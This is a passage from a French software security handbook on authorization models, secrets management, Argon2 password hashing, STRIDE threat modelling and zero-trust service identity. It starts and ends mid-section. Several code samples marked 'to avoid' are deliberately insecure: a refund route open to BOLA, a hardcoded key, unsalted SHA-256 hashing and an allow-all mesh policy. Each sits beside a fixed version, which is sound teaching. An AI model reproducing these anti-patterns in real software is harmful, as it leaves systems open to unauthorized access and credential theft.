**Quand** : peu de types d'utilisateurs, des droits stables, et la question « qui peut faire quoi ? » doit se répondre en lisant une table. **Limite** : le RBAC ne sait pas dire « seulement ses propres commandes » ni « seulement en France ». Si j'essaie, j'obtiens une explosion de rôles (`support-france-lecture-seule`, `support-belgique-remboursement`...), et je ne protège toujours pas contre le [BOLA](#les-failles-les-plus-courantes-des-api).

:material-book-open-variant: Doc de référence : [NIST, Role Based Access Control](https://csrc.nist.gov/projects/role-based-access-control) (consultée en novembre 2026)
{ .doc-ref }

### ABAC : des attributs
<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

L'**<span class="term" data-term="abac">ABAC</span>** (*Attribute-Based Access Control*, décrit par le NIST dans la SP 800-162, 2014) décide à partir d'attributs : ceux de la personne (rôle, pays, équipe), de la ressource (propriétaire, pays, montant, statut), de l'action, et du contexte (heure, réseau). La règle se lit comme une phrase : « un agent de support peut rembourser une commande de son pays jusqu'à 100 € ».

```python
# À éviter : vérifier seulement le rôle
def can_refund(user, order):
    return "support" in user.roles
```
Avec le rôle seul, un agent de support en Espagne peut rembourser une commande française de 2 000 €, et rien dans le code ne l'en empêche.

```python
# Bien : une règle qui combine le rôle, le pays de l'agent et le montant de la commande
MAX_SUPPORT_REFUND_CENTS = 10_000


def can_refund(user, order):
    return (
        "support" in user.roles
        and user.country == order.country
        and order.total_cents <= MAX_SUPPORT_REFUND_CENTS
    )
```

Au-delà de quelques règles, je les sors du code applicatif dans un moteur de politiques (<span class="term" data-term="policy-as-code">policy as code</span>) : OPA avec le langage Rego, ou Cedar (publié en open source par AWS en 2023). Les règles sont versionnées, relues en MR et testées comme du code.

**Quand** : la décision dépend des données (pays, montant, propriétaire, statut), et les rôles se multiplient. **Pourquoi** : une règle remplace des dizaines de rôles. Le coût : répondre à « qui peut rembourser cette commande ? » demande d'évaluer la règle, pas de lire une table, donc l'audit est plus difficile.

:material-book-open-variant: Doc de référence : [NIST SP 800-162, Guide to ABAC Definition and Considerations](https://csrc.nist.gov/pubs/sp/800/162/upd2/final) (2014, mise à jour en 2019, à vérifier)
{ .doc-ref }

### ReBAC : des relations
<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a> <span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le **<span class="term" data-term="rebac">ReBAC</span>** (*Relationship-Based Access Control*) déduit les droits d'un graphe de relations. Le modèle a été popularisé par Zanzibar, le système d'autorisation de Google derrière Drive et YouTube (article présenté à USENIX ATC en 2019). Les droits se stockent comme des liens « objet, relation, utilisateur » :

| Objet | Relation | Utilisateur |
|---|---|---|
| `team:core` | `member` | `user:ada` |
| `folder:invoices` | `editor` | `team:core#member` |
| `doc:invoice-42` | `parent` | `folder:invoices` |

La règle « un éditeur du dossier parent peut modifier le document » suffit : ada peut modifier `invoice-42`, parce qu'elle est membre de team-core, éditrice du dossier qui contient la facture. Retirer ada de l'équipe lui retire tous ces droits d'un coup.

**Quand** : du partage entre utilisateurs, comme des documents partagés, des organisations imbriquées, des dossiers qui héritent des droits de leur parent. **Pas** : un back-office avec quatre rôles. **Comment** : un service dédié (OpenFGA, SpiceDB, Ory Keto) que chaque service interroge (« ada peut-elle `edit` `doc:invoice-42` ? »). Le coût : un composant critique de plus, et des relations à garder synchronisées avec les données métier.

:material-book-open-variant: Doc de référence : [Zanzibar: Google's Consistent, Global Authorization System](https://www.usenix.org/conference/atc19/presentation/pang) (USENIX ATC, 2019) ; [OpenFGA, Authorization Concepts](https://openfga.dev/docs/authorization-concepts) (consultée en novembre 2026)
{ .doc-ref }

### Où appliquer les contrôles
<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a> <span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Quel que soit le modèle, la décision doit être prise côté serveur, au plus près de la donnée, et refuser par défaut. Chaque couche a son rôle :

```mermaid
flowchart LR
  F["Front<br/>cache le bouton<br/>(confort, pas sécurité)"] --> G["Passerelle<br/>jeton valide ? scope ?"]
  G --> S["Service<br/>permission + propriétaire<br/>de l'objet"]
  S --> D["Base<br/>requête filtrée<br/>par propriétaire"]
```

```python
# À éviter : le front masque le bouton et la passerelle vérifie le jeton, mais la route rembourse n'importe quelle commande
@app.post("/orders/{order_id}/refund")
def refund_order(order_id: int, user: User = Depends(current_user)):
    return refunds.create(orders_repo.get(order_id))


# Bien : le service vérifie la permission et cherche la commande parmi celles que l'agent peut voir
@app.post("/orders/{order_id}/refund")
def refund_order(order_id: int, user: User = Depends(current_user)):
    order = orders_repo.get_visible_to(order_id, user)
    if order is None or not can_refund(user, order):
        raise HTTPException(status_code=404)
    return refunds.create(order)
```

Dans la première version, un appel `curl` direct, avec un jeton valide d'un simple client, rembourse la commande d'un autre. Le front et la passerelle filtrent le grossier ; seul le service connaît le propriétaire et le pays de la commande. Je centralise la **décision** (un module `can()` ou un moteur de politiques) mais je l'applique dans chaque service, avec le <span class="term" data-term="least-privilege">moindre privilège</span> : un rôle n'a que les permissions dont il a besoin. Sur PostgreSQL, la sécurité au niveau des lignes (*Row-Level Security*) ajoute un filet dans la base elle-même.

| Je veux... | J'utilise... |
|---|---|
| distinguer quelques profils stables, comme client, agent de support et administrateur d'un back-office | RBAC : rôles, permissions, une table lisible |
| qu'un agent de support ne rembourse que les commandes de son pays et sous un plafond | ABAC : une règle sur les attributs, dans un moteur de politiques si les règles se multiplient |
| que des utilisateurs partagent des documents ou des dossiers entre eux, avec héritage des droits | ReBAC : OpenFGA ou SpiceDB, sur le modèle de Zanzibar |
| être sûr qu'un appel direct à l'API, sans passer par le front, ne contourne pas les droits | le contrôle dans le service, plus un test de refus par rôle et par route |

**Risques.** Appliquer le contrôle dans chaque service, c'est autant d'endroits où l'oublier : une nouvelle route sans contrôle passe inaperçue en revue. Je fais refuser par défaut (une route sans règle explicite répond `403`) et j'écris un test de refus par rôle et par route. Un moteur de politiques central devient aussi un point critique : s'il ne répond plus, je refuse plutôt que d'autoriser.

:material-book-open-variant: Doc de référence : [OWASP, Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | les droits sont des `if` sur des noms de rôles dans le code, et le front cache les boutons |
    | N2 | une table rôle vers permissions ou un module `can()` unique décide partout, et chaque service vérifie le propriétaire de l'objet |
    | N3 | la décision passe par un moteur de politiques en refus par défaut, les politiques sont testées en CI, et la base filtre aussi par propriétaire (Row-Level Security) |
    | N4 | l'équipe suit les refus par règle et les permissions jamais utilisées, et retire les droits inutiles d'après ces chiffres |

    **Je mesure** : le nombre de tests de noms de rôles en dur dans le code, compté par une règle SAST ; la part des permissions accordées et jamais utilisées sur 90 jours, lue dans les journaux de décision.

## Les secrets

<a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <a class="pill pill-scope pill-scope-infra" href="../architecture/#carte-des-echelles">Échelle · Infrastructure</a>

<a class="pill pill-dora" href="https://dora.dev/capabilities/pervasive-security/">DORA · Pervasive security</a>


### Ce qu'il ne faut jamais faire
```python
# À éviter : secret en dur dans le code, il finit dans Git pour toujours
API_KEY = "sk_live_51H8..."
```
Un secret dans le code finit dans Git, donc dans chaque clone, chaque fork, et l'<span class="term" data-term="git-history">historique</span> pour toujours.

```python
# Bien : le secret est lu au démarrage, injecté par le gestionnaire de secrets ou la CI
API_KEY = os.environ["PAYMENT_API_KEY"]
```

### Les bonnes pratiques
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

| Pratique                                       | Exemple                                                      |
|------------------------------------------------|--------------------------------------------------------------|
| secrets dans un gestionnaire dédié             | Vault, <span class="term" data-term="secret-manager">gestionnaire de secrets</span> du cloud, variables masquées de la CI |
| détecter avant le commit                       | gitleaks en <span class="term" data-term="pre-commit-hook">hook pre-commit</span> et dans la CI                    |
| un secret commité est un secret compromis      | le révoquer et en générer un nouveau, même dans un dépôt privé |
| jamais de secret dans les logs                 | masquer `Authorization`, `password`, `token` avant d'écrire  |
| droits minimaux                                | un compte en lecture seule pour les tests qui ne font que lire |
| durée de vie courte                            | des jetons qui expirent en heures, pas en mois               |

Changer un secret sans coupure demande deux versions valides pendant un court recouvrement : on crée la nouvelle, les applications la prennent, puis on révoque l'ancienne. Après une fuite, c'est le même déroulé en accéléré, et si le secret est public, on révoque l'ancienne version d'abord en acceptant une courte coupure.

```mermaid
sequenceDiagram
  participant O as Job de rotation
  participant G as Gestionnaire de secrets
  participant DB as Base de données
  participant A as my-api
  O->>DB: crée le mot de passe v2, v1 reste valide
  O->>G: enregistre v2 comme version courante
  A->>G: relit le secret à expiration du cache
  G-->>A: v2
  A->>DB: se connecte avec v2
  O->>DB: vérifie qu'aucune session n'utilise plus v1
  O->>DB: révoque v1
```

**Risques.** Le gestionnaire de secrets devient un point central : s'il est injoignable au démarrage, les applications ne démarrent plus. Un scanner trop bavard, comme gitleaks qui signale des données de test, installe l'habitude de `git commit --no-verify`, et le vrai secret passe le jour où il arrive. Je garde en cache le dernier secret lu pour tenir pendant une courte panne, je déclare les faux positifs dans la liste d'exceptions du scanner (`.gitleaksignore`), et je garde le scan dans la CI, que `--no-verify` ne saute pas.

:material-book-open-variant: Doc de référence : [OWASP, Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) (consultée en novembre 2026) ; [gitleaks](https://github.com/gitleaks/gitleaks) (consultée en novembre 2026)
{ .doc-ref }

### Stocker un mot de passe
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Jamais en clair, jamais avec un simple <span class="term" data-term="hash">hachage</span> rapide (MD5, SHA-256). Avec un algorithme **volontairement lent** et un <span class="term" data-term="salt">sel</span> : Argon2id, bcrypt ou scrypt. Le sel (une valeur aléatoire par utilisateur) empêche de comparer d'un coup des millions de mots de passe à une table précalculée. Le mieux reste de ne pas stocker de mots de passe du tout, en déléguant la connexion à un fournisseur d'identité.

!!! noob "As noob"
    Hacher un mot de passe, c'est le passer au broyeur : on ne peut pas reconstituer la feuille, seulement broyer de nouveau un candidat et comparer. Un algorithme lent rend chaque essai coûteux pour un attaquant, et le sel est un ingrédient différent ajouté pour chaque personne, pour que deux mots de passe identiques ne donnent pas le même résultat. La phrase à retenir : **lent et salé, pour que deviner coûte cher, compte par compte.**

En Python, avec la bibliothèque `argon2-cffi` :
```python
import hashlib

from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher()


# À éviter : SHA-256 sans sel, des milliards d'essais par seconde, et deux mots de passe égaux donnent la même empreinte
def hash_password_fast(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()



# Bien : argon2id, lent et salé, le sel est stocké dans le résultat
def hash_password(password: str) -> str:
    return ph.hash(password)


# Exemple : vérifie un essai contre l'empreinte stockée
def check_password(stored: str, attempt: str) -> bool:
    try:
        ph.verify(stored, attempt)
    except VerifyMismatchError:
        return False
    return True
```
La chaîne stockée en base contient tout ce qu'il faut pour vérifier plus tard :
```
$argon2id$v=19$m=65536,t=3,p=4$c2VsYWxlYXRvaXJl$Zp3m0qN1YcG0...
 algo     version  paramètres     sel (base64)    empreinte (base64)
```
`m` est la mémoire en Kio, `t` le nombre de passes, `p` le parallélisme (valeurs par défaut de la bibliothèque, à vérifier selon la version). Comme les paramètres sont dans la chaîne, on peut les durcir plus tard : `ph.check_needs_rehash(stored)` dit s'il faut recalculer l'empreinte à la prochaine connexion réussie.

**Risques.** Un hachage volontairement lent coûte aussi à mon serveur : avec des paramètres trop lourds, une rafale de tentatives sur la page de connexion sature le processeur. Je règle les paramètres pour rester autour de quelques centaines de millisecondes par vérification (ordre de grandeur, à mesurer sur ma machine) et je limite le débit des tentatives.

:material-book-open-variant: Doc de référence : [OWASP, Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) (consultée en novembre 2026) ; [RFC 9106, Argon2](https://www.rfc-editor.org/rfc/rfc9106) (2021)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | les secrets sont hors du code, dans des variables d'environnement copiées à la main |
    | N2 | les secrets vivent dans un gestionnaire, gitleaks tourne en hook pre-commit et dans la CI, et les logs masquent `Authorization` et `password` |
    | N3 | un secret détecté dans une MR la bloque seul, et la rotation tourne automatiquement avec deux versions valides pendant le recouvrement |
    | N4 | l'équipe suit l'âge des secrets, les fuites détectées et le délai de révocation, et raccourcit les durées de vie d'après ces chiffres |

    **Je mesure** : l'âge du plus vieux secret encore valide, lu dans le gestionnaire de secrets ; le délai entre la détection d'une fuite et la révocation, lu dans le suivi des incidents.

## Modéliser les menaces (STRIDE)

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

<a class="pill pill-practice" href="../livraison/#concevoir-avant-de-coder">Pratique · Conception technique</a>
<a class="pill pill-dora" href="https://dora.dev/capabilities/pervasive-security/">DORA · Pervasive security</a>

### Ce que c'est
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

La <span class="term" data-term="threat-modeling">modélisation des menaces</span> consiste à dessiner un système et à lister ce qu'un attaquant pourrait y faire, **avant** d'écrire le code. Une faille trouvée sur un schéma coûte une ligne de schéma ; trouvée en production, elle coûte une refonte.

Adam Shostack (« Threat Modeling: Designing for Security », 2014) résume la méthode en quatre questions :

| Question                                  | Ce qu'on produit                                   |
|-------------------------------------------|----------------------------------------------------|
| sur quoi travaille-t-on ?                 | un schéma des flux de données                      |
| qu'est-ce qui peut mal tourner ?          | une liste de menaces, avec la grille STRIDE        |
| que fait-on contre ?                      | une mesure par menace : corriger, réduire, accepter ou transférer |
| a-t-on bien travaillé ?                   | des tests et des contrôles qui prouvent les mesures |

**Risques.** Une modélisation faite une fois, rangée dans un wiki et jamais reprise, donne une fausse assurance : le système change, le document non. Une séance trop longue ou trop exhaustive décourage l'équipe de la refaire. Je garde le format court et je reprends le schéma à chaque nouveau flux.

:material-book-open-variant: Doc de référence : [OWASP, Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html) (consultée en novembre 2026)
{ .doc-ref }

### Le schéma : flux de données et frontières de confiance
On part d'un <span class="term" data-term="data-flow-diagram">diagramme de flux de données</span> : les acteurs, les traitements, les stockages et les flèches entre eux. Une <span class="term" data-term="trust-boundary">frontière de confiance</span> est l'endroit où une donnée passe d'une zone à une autre qui ne lui fait pas confiance : internet vers l'API, l'API vers la base, un service vers un fournisseur externe. C'est sur ces frontières que se concentrent les menaces.

!!! noob "As noob"
    Une frontière de confiance, c'est la douane : à chaque passage d'un pays à un autre, on contrôle ce qui entre, parce que celui qui reçoit ne connaît pas celui qui envoie. Les problèmes arrivent surtout à ces postes, rarement au milieu d'un pays. La phrase à retenir : **dessine les frontières, puis cherche les menaces à chaque passage.**

Exemple : un client envoie une photo de profil à `my-api`, qui la stocke et la fait redimensionner.

```mermaid
flowchart LR
    subgraph internet["Internet (non fiable)"]
        ada["Navigateur de ada"]
    end
    subgraph app["Zone applicative"]
        api["my-api"]
        resize["resize-worker"]
    end
    subgraph data["Zone données"]
        db[("Base des profils")]
        bucket[("Stockage des images")]
    end
    ada -- "(1) PUT /me/avatar + jeton" --> api
    api -- "(2) écrit l'image" --> bucket
    api -- "(3) met à jour le profil" --> db
    bucket -- "(4) événement : image créée" --> resize
    resize -- "(5) écrit la miniature" --> bucket
```

### La grille STRIDE
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

<span class="term" data-term="stride">STRIDE</span> (Loren Kohnfelder et Praerit Garg, Microsoft, 1999) donne six familles de menaces à passer sur chaque élément et chaque flèche du schéma. Chaque lettre est la violation d'une propriété de sécurité.

| Lettre | Menace                                  | Propriété violée  | Exemple sur le schéma                                   | Mesure                                             |
|--------|-----------------------------------------|-------------------|---------------------------------------------------------|----------------------------------------------------|
| S      | usurpation d'identité (spoofing)        | authentification  | un jeton volé permet de changer l'avatar de ada (1)     | jetons courts, <span class="term" data-term="dpop">DPoP</span> pour les clients publics |
| T      | altération (tampering)                  | intégrité         | l'image est remplacée dans le stockage après le contrôle (2, 4) | seule l'API écrit dans le stockage, empreinte SHA-256 vérifiée par le worker |
| R      | répudiation                             | traçabilité       | « je n'ai jamais envoyé cette image »                   | journal d'audit : qui, quand, empreinte du fichier |
| I      | divulgation d'information               | confidentialité   | le stockage est public, ou une photo garde ses coordonnées GPS | stockage privé, métadonnées EXIF supprimées       |
| D      | déni de service                         | disponibilité     | une image de 500 Mo ou une « bombe » de décompression bloque le worker (4) | taille maximale, temps de traitement limité, quota par utilisateur |
| E      | élévation de privilèges                 | autorisation      | une faille de la bibliothèque d'images donne la main sur le worker | worker isolé, sans réseau sortant, avec le <span class="term" data-term="least-privilege">moindre privilège</span> |

Chaque mesure devient une exigence testable : « une image de 21 Mo est refusée », « le bucket refuse une lecture anonyme ». Une menace qu'on choisit de garder devient un <span class="term" data-term="accepted-risk">risque accepté</span>, écrit, avec un responsable et une date de revue.

:material-book-open-variant: Doc de référence : [Microsoft, Threat Modeling Tool threats (STRIDE)](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats) (consultée en novembre 2026)
{ .doc-ref }

### Quand le faire
| Situation | Modélisation ? |
|---|---|
| j'ouvre une nouvelle porte vers l'extérieur, comme une API publique, un envoi de fichiers ou un <span class="term" data-term="webhook">webhook</span> qu'un partenaire appelle | oui, avant le développement |
| mon service va manipuler des données sensibles qu'il ne voyait pas avant, comme des données de santé, de paiement ou d'identité | oui |
| je branche un nouveau fournisseur, ou une donnée passe une nouvelle frontière de confiance, comme un envoi vers un service de paiement externe | oui |
| l'architecture change, par exemple je découpe un service en deux ou j'ajoute un nouveau stockage | oui, en reprenant le schéma existant |
| je corrige un libellé ou je refactore sans créer de nouveau flux de données | non |

Format conseillé : une heure, l'équipe qui construit, un schéma au tableau. On refait l'exercice à chaque changement de schéma plutôt qu'une grande analyse une fois par an. Le Threat Modeling Manifesto (collectif d'auteurs, 2020) donne les principes pour en faire une habitude d'équipe.

:material-book-open-variant: Doc de référence : [Threat Modeling Manifesto](https://www.threatmodelingmanifesto.org/) (2020)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | une personne fait une modélisation des menaces avant un gros projet, de sa propre initiative |
    | N2 | toute nouvelle entrée externe ou donnée sensible déclenche une séance d'une heure, avec schéma de flux, grille STRIDE et une exigence testable par mesure |
    | N3 | la séance fait partie du rituel de conception : le modèle de document d'architecture a une section menaces, remplie sans que personne le demande |
    | N4 | l'équipe suit la part des incidents de sécurité qu'une modélisation avait prévus, et ajuste ses déclencheurs et sa grille d'après ces chiffres |

    **Je mesure** : la part des décisions d'architecture de l'année qui ont une section menaces remplie, lue dans le dossier des décisions ; le nombre de risques acceptés dont la date de revue est dépassée.

## Zero trust et identité entre services

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a> <a class="pill pill-scope pill-scope-infra" href="../architecture/#carte-des-echelles">Échelle · Infrastructure</a>

<a class="pill pill-dora" href="https://dora.dev/capabilities/pervasive-security/">DORA · Pervasive security</a>

### Ce que c'est
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le modèle classique protège le **périmètre** : un pare-feu à l'entrée, et tout ce qui est à l'intérieur se fait confiance. Le problème : un attaquant qui prend la main sur un seul service, même un petit outil interne, peut ensuite appeler tous les autres, payments-service compris.

Le <span class="term" data-term="zero-trust">zero trust</span> part de l'hypothèse inverse : le réseau interne est déjà compromis. Être dans le cluster ne donne **aucun** droit ; chaque appel est authentifié, autorisé et chiffré, comme s'il venait d'internet. La référence est le NIST SP 800-207 (« Zero Trust Architecture », août 2020).

!!! noob "As noob"
    Dans le modèle du périmètre, une fois passé l'accueil d'un immeuble, mon badge ouvre tous les étages. En zero trust, chaque porte vérifie mon badge et décide si j'ai le droit d'entrer dans cette pièce-là, même si je suis déjà dans le bâtiment. La phrase à retenir : **être à l'intérieur ne prouve rien, chaque appel montre qui il est.**

```mermaid
flowchart LR
  S["orders-service<br/>sujet"] -->|"requête + identité mTLS"| PEP["point d'application<br/>sidecar ou passerelle"]
  PEP -->|"puis-je laisser passer ?"| PDP["point de décision<br/>moteur de politiques"]
  PDP -->|"oui ou non"| PEP
  POL[("politiques, identités,<br/>état des services")] --> PDP
  PEP -->|"si autorisé"| R["payments-service<br/>ressource"]
```

Le NIST SP 800-207 sépare le **point de décision** (qui juge, à partir des politiques) du **point d'application** (qui bloque ou laisse passer, au plus près du service). Dans un service mesh, le second est le proxy placé à côté de chaque service.

**Risques.** Le zero trust coûte : une autorité de certificats à faire tourner, un service mesh à exploiter, et une panne de cette autorité empêche les services de se parler. Une migration laissée en mode permissif donne l'impression d'être protégé alors que le clair reste accepté. Je fixe une date de passage en mode strict, service par service.

:material-book-open-variant: Doc de référence : [NIST SP 800-207, Zero Trust Architecture](https://csrc.nist.gov/pubs/sp/800/207/final) (2020)
{ .doc-ref }

### Les briques
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

| Brique                          | Ce que c'est                                                                 | Exemple                                         |
|---------------------------------|------------------------------------------------------------------------------|-------------------------------------------------|
| identité de charge de travail   | une identité donnée par la plateforme au service qui tourne, sans secret copié à la main | le pod de orders-service reçoit son identité au démarrage |
| SPIFFE                          | un standard qui nomme chaque service par une URI et lui fournit un certificat qui le prouve | `spiffe://example.org/ns/prod/sa/orders-service` |
| mTLS                            | TLS où **les deux côtés** présentent un certificat : chacun prouve son identité à l'autre, et l'échange est chiffré | orders-service et payments-service se vérifient mutuellement |
| politique d'autorisation        | une règle « qui peut appeler quoi », en refus par défaut                     | seul orders-service peut appeler `POST /charges` |
| <span class="term" data-term="short-lived-credential">identifiants à courte durée de vie</span> | des certificats et jetons qui expirent en minutes ou en heures, renouvelés automatiquement | certificat valable 1 h, jeton valable 5 min (exemple) |

Une <span class="term" data-term="workload-identity">identité de charge de travail</span> remplace la clé d'API partagée : il n'y a plus rien à voler dans une variable d'environnement, et rien à faire tourner à la main. <span class="term" data-term="spiffe">SPIFFE</span> (projet de la CNCF, à vérifier pour son statut actuel) est le format le plus répandu ; SPIRE est son implémentation de référence, et plusieurs <span class="term" data-term="service-mesh">service mesh</span> (Istio, Linkerd) délivrent des identités compatibles.

*Istio : concurrent de Linkerd ; complémentaire de Envoy*<br>
*Linkerd : concurrent de Istio*
{ .tool-rel }


```mermaid
sequenceDiagram
  participant O as orders-service
  participant P as payments-service
  O->>P: ClientHello
  P-->>O: ServerHello, certificat de payments-service, demande de certificat
  O->>O: vérifie le certificat avec l'autorité de confiance
  O->>P: certificat de orders-service, preuve de possession de la clé privée
  P->>P: vérifie le certificat, lit l'identité SPIFFE
  Note over O,P: canal chiffré, chacun sait qui est l'autre
  O->>P: POST /charges
```

**Risques.** Des certificats valables une heure dépendent de leur renouvellement : si l'agent qui les renouvelle tombe, tous les appels échouent dans l'heure. Une politique en refus par défaut casse une nouvelle fonction dont la règle a été oubliée : le jour où Léo branche reporting-service sur `GET /charges`, il reçoit un `403` en production. Je surveille l'âge des certificats avec une alerte bien avant leur expiration, et je teste les règles d'autorisation en préproduction avant de les appliquer.

:material-book-open-variant: Doc de référence : [SPIFFE, Overview](https://spiffe.io/docs/latest/spiffe-about/overview/) (consultée en novembre 2026) ; [RFC 8446, TLS 1.3](https://www.rfc-editor.org/rfc/rfc8446) (2018)
{ .doc-ref }

### Avant et après
```
avant (périmètre)                            après (zero trust)
réseau plat, HTTP en clair                   mTLS partout, chiffré et authentifié
une clé d'API commune à tous les services    une identité SPIFFE par service
clé jamais changée                           certificat renouvelé toutes les heures
tout le monde peut appeler tout le monde     refus par défaut, règles par service et par route
une clé volée = accès à tout                 un service compromis = accès à ses seules routes autorisées
```

Le <span class="term" data-term="mtls">mTLS</span> prouve **quel service** appelle, pas **pour quel utilisateur**. Quand orders-service agit pour ada, il transmet aussi un jeton utilisateur dont l'audience est payments-service, pour que le service final vérifie les droits de ada et pas seulement ceux du service appelant (échange de jeton : RFC 8693, 2020). Un jeton peut aussi être lié au certificat mTLS du client (RFC 8705, 2020) : volé, il ne sert à rien sans le certificat, comme avec DPoP.

### Lien avec Client Credentials
Le flux [Client Credentials](#client-credentials-un-service-parle-a-un-service) reste valable pour un service qui appelle une API protégée par OAuth, notamment hors du cluster. Mais son `client_secret` est un secret long à stocker et à faire tourner. Avec une identité de charge de travail, le service s'authentifie avec son certificat ou un jeton signé par la plateforme, et plusieurs fournisseurs d'identité acceptent ce jeton à la place du `client_secret` (fédération d'identité de charge de travail, à vérifier selon le fournisseur).

:material-book-open-variant: Doc de référence : [RFC 8693, OAuth 2.0 Token Exchange](https://www.rfc-editor.org/rfc/rfc8693) (2020) ; [RFC 8705, OAuth 2.0 Mutual-TLS](https://www.rfc-editor.org/rfc/rfc8705) (2020)
{ .doc-ref }

### Par où commencer
1. Supprimer les secrets partagés entre services : c'est le risque le plus grave.
2. Donner une identité à chaque service et activer le mTLS en mode permissif (clair et chiffré acceptés), pour mesurer qui parle encore en clair.
3. Passer service par service en mode strict.
4. Écrire les politiques d'autorisation à partir du trafic observé, puis les appliquer en refus par défaut.
5. Journaliser chaque refus et le suivre pendant la transition.

:material-book-open-variant: Doc de référence : [CISA, Zero Trust Maturity Model](https://www.cisa.gov/zero-trust-maturity-model) (version 2.0, 2023)
{ .doc-ref }

### Une politique en refus par défaut
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Exemple avec Istio : seul le <span class="term" data-term="service-account">compte de service</span> de orders-service peut appeler `POST /charges` sur payments-service.

```yaml
# À éviter : tout service du namespace prod peut appeler payments-service, y compris un service compromis
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: payments-allow-all
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payments-service
  action: ALLOW
  rules:
    - from:
        - source:
            namespaces: ["prod"]
```
Avec cette règle, n'importe quel service de `prod`, même un service oublié ou piraté, peut déclencher un paiement. La bonne version nomme le seul appelant légitime :
```yaml
# Bien : refus par défaut, seul orders-service peut faire POST /charges
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: payments-allow-orders
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payments-service
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/prod/sa/orders-service"]
      to:
        - operation:
            methods: ["POST"]
            paths: ["/charges"]
```
Dès qu'une politique `ALLOW` vise un service, toute requête qui ne correspond à aucune règle est refusée (`403`) : billing-service, un `GET /charges` de orders-service ou un appel sans identité mTLS. L'identité vérifiée (`principals`) vient du certificat mTLS, pas d'un en-tête qu'on pourrait forger.

**Risques.** Une politique en refus par défaut posée sans regarder le trafic coupe des appels légitimes oubliés : la sonde de supervision, un job de rapprochement qui n'appelle qu'une fois par mois. J'écris les règles d'après le trafic observé sur une période assez longue, et je surveille les `403` juste après l'application.

:material-book-open-variant: Doc de référence : [Istio, Authorization Policy](https://istio.io/latest/docs/reference/config/security/authorization-policy/) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | le réseau interne se fait confiance, mais l'équipe a listé les secrets partagés entre services |
    | N2 | chaque service a son identité, le mTLS est actif en mode permissif, et le trafic encore en clair est mesuré |
    | N3 | le mTLS est strict, et les politiques en refus par défaut bloquent seules tout appel non prévu, en le journalisant |
    | N4 | l'équipe suit les refus par politique et la durée de vie des identifiants, et resserre les règles d'après le trafic observé |

    **Je mesure** : la part du trafic entre services chiffré et authentifié par mTLS, lue dans le service mesh ; le nombre de secrets partagés par plusieurs services, compté dans le gestionnaire de secrets.

## Données personnelles et RGPD dans l'architecture

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a> <a class="pill pill-scope pill-scope-enterprise" href="../architecture/#carte-des-echelles">Échelle · Entreprise</a>

### Ce que c'est
Le <span class="term" data-term="gdpr">RGPD</span> (règlement européen 2016/679, adopté en 2016 et appliqué depuis mai 2018) encadre tout traitement de **données personnelles** : toute information qui se rapporte à une personne identifiable, directement (nom, e-mail) ou indirectement (identifiant client, adresse IP).

Son article 25 impose la <span class="term" data-term="privacy-by-design">protection des données dès la conception et par défaut</span> : la protection fait partie de l'architecture, et le réglage par défaut est le plus protecteur. Pour une équipe technique, ça se traduit par cinq décisions de conception.

:material-book-open-variant: Doc de référence : [Règlement (UE) 2016/679, RGPD](https://eur-lex.europa.eu/eli/reg/2016/679/oj) (2016)
{ .doc-ref }

### Les mots du RGPD
| Terme                              | Ce que c'est                                                                 |
|------------------------------------|------------------------------------------------------------------------------|
